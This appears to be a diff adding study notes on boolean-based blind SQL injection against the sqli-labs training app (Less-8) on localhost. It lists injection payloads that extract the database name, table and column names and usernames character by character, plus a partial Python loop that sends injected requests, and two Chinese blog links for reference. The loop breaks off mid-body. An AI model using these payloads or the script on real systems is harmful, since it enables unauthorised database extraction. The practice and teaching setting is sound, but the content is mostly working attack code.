@@ -1,0 +1,15 @@
+length(database())>7
+ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100
+ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>117
+ascii(substr((select username from users limit 0,1),1,1))>6
+
+
+    for i in range(9999):
+        url='''http://127.0.0.1/sqli/Less-8/'''
+        payload='''?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit %d,1))>1''' %i
+        r=requests.get(url+payload+' --+ ')
+        if('You are in' in r.text):
+            #print(i) #数据库中有多少个表
+布尔盲注参考：
+https://blog.csdn.net/qq_41554179/article/details/88414079
+https://blog.csdn.net/Wu000999/article/details/100041049
